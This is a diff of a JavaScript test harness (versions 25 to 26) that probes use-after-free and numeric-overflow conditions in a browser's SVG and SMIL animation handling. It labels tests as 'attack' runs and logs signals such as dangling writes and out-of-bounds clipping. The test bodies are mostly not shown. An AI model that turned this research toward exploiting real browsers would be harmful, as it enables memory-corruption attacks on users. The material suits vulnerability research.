-  // Check: does bv_AW still return our attack value, or did animator overwrite it?
-  var w_after_remove = null;
-  try { w_after_remove = bv_AW ? bv_AW.value : null; } catch(e) {}
-  log('  after remove: bv_AW.value=' + w_after_remove + ' (attack=' + ATTACK + ')', w_after_remove === ATTACK ? 'ok' : 'bad');
-
-  // Wait a few frames - if animator still running on removed element, value changes
-  await raf(); await raf(); await raf();
-  var w_after_raf = null;
-  try { w_after_raf = bv_AW ? bv_AW.value : null; } catch(e) {}
-  log('  3 RAFs after remove: bv_AW.value=' + w_after_raf, 'inf');
-
-  var animatorStillRunning = (w_after_raf !== ATTACK);
-  if (animatorStillRunning) {
-    log('  [!!] SMIL ANIMATOR OVERWROTE our value on REMOVED element!', 'bad');
-    log('  [!!] animator running on removed element = multi-threaded UAF vector', 'bad');
-  } else {
-    log('  animator stopped on remove (or was never running)', 'ok');
-  }
-
-  A.remove();
-  log('[*] CSS: animatorContinued=' + animatorStillRunning, animatorStillRunning ? 'bad' : 'ok');
-  if (!q) dis(false);
-  return { animatorContinued: animatorStillRunning, w_before: w_before, w_after: w_after_raf };
+  return { done: true };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v25 - pivot to dangling write exploitation', 'inf');
+  log('SVG UAF v26 - 1e38 attack: viewBox, clipPath, filter, paint, matrix', 'inf');
   sep();
 
-  var results = {};
   var tests = [
-    ['RLV_relive', runRLV],
-    ['LYT_layout', runLYT],
-    ['CHN_chain',  runCHN],
-    ['MUL_spray',  runMUL],
-    ['CSS_anim',   runCSS]
+    ['VBX_viewbox',  runVBX],
+    ['CLP_clippath', runCLP],
+    ['FLT_filter',   runFLT],
+    ['PNT_paint',    runPNT],
+    ['MTX_matrix',   runMTX]
   ];
 
   for (var i = 0; i < tests.length; i++) {
     var lbl = tests[i][0];
     var fn  = tests[i][1];
     sep(); log(lbl, 'inf'); sep();
-    try { results[lbl] = await fn(true); }
-    catch(e) { log('[!] ' + lbl + ': ' + e, 'bad'); results[lbl] = null; }
+    try { await fn(true); }
+    catch(e) { log('[!] ' + lbl + ': threw ' + e, 'bad'); }
     log('');
   }
 
   sep();
-  log('SUMMARY v25', 'inf');
+  log('SUMMARY v26', 'inf');
   sep();
-
-  var summary = {
-    'RLV': results['RLV_relive'] ? results['RLV_relive'].writePersists : '?',
-    'LYT_nan': results['LYT_layout'] ? results['LYT_layout'].anyNan : '?',
-    'LYT_inf': results['LYT_layout'] ? results['LYT_layout'].anyInf : '?',
-    'CHN': results['CHN_chain'] ? results['CHN_chain'].B_affected : '?',
-    'MUL_xtalk': results['MUL_spray'] ? results['MUL_spray'].crossTalk : '?',
-    'CSS_race': results['CSS_anim'] ? results['CSS_anim'].animatorContinued : '?'
-  };
-
-  var keys = Object.keys(summary);
-  for (var ki = 0; ki < keys.length; ki++) {
-    var k = keys[ki];
-    var v = summary[k];
-    log('  ' + k + ': ' + v, v === true ? 'bad' : 'dim');
-  }
+  log('  check console for crashes / anomalous values', 'inf');
+  log('  key signals:', 'inf');
+  log('    VBX: bbox_w >> 200 (coordinate overflow)', 'inf');
+  log('    CLP: crash or visible rendering glitch (clip OOB)', 'inf');
+  log('    FLT: getTotalLength exception or huge value (filter OOB)', 'inf');
+  log('    PNT: getTotalLength overflow or crash', 'inf');
+  log('    MTX: getScreenCTM returns 1e38 in e/f (matrix overflow)', 'inf');
   sep();
   dis(false);
 }
